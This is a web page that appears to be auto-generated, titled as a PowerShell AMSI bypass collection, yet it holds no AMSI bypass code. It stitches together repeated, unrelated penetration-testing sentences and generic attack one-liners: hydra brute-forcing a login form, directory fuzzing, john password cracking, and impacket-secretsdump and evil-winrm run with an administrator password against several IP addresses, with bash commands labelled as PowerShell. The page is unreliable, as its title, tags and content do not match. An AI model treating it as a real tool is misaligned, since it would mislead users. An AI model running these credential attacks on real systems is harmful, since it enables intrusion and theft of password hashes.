---
TitleSEO: "AMSI Bypass Collection in PowerShell | ZureFX"
TitlePost: "AMSI Bypass Collection — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for amsi bypass collection. Built for security research and automation."
Keywords: "fuzzer, rust, powershell, tool"
URL: "https://zurefx.github.io/scripting/script-amsi-bypass-collection-922.html"
URL_IMAGES: ""
Date: "2025-05-21"
Tags: "Fuzzer, Rust, PowerShell, Tool"
Section: "scripting"
Lang: "en"
main_img: "script-amsi-bypass-collection-922"
Permalink: "/scripting/script-amsi-bypass-collection-922.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The kernel version was outdated and vulnerable to a publicly known exploit. Post-exploitation enumeration revealed a path to domain administrator privileges. The service account had excessive permissions assigned in Active Directory.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `impacket`
- `mimikatz`
- `lookupsid`

## Implementation

### Core Logic

The database credentials were hardcoded in the application source code. Initial enumeration revealed several interesting open ports on the target.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.14.198.116 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Privilege escalation was possible due to misconfigured sudo permissions. The service account had excessive permissions assigned in Active Directory.

### Helper Functions

The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.11.184.168/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.67.47.207
```

## Usage

### Basic Usage

Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible.

```bash
evil-winrm -i 10.45.113.131 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.42.57.78
```

### Advanced Options

Privilege escalation was possible due to misconfigured sudo permissions. The database credentials were hardcoded in the application source code. The database credentials were hardcoded in the application source code.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.89.147.74
evil-winrm -i 10.66.193.34 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.61.195.139
```

## Output

### Example Output

Group Policy Preferences contained encrypted but recoverable credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

```
[+] Scanning target...
[+] Found 10 results
[+] Done in 16.34s
```
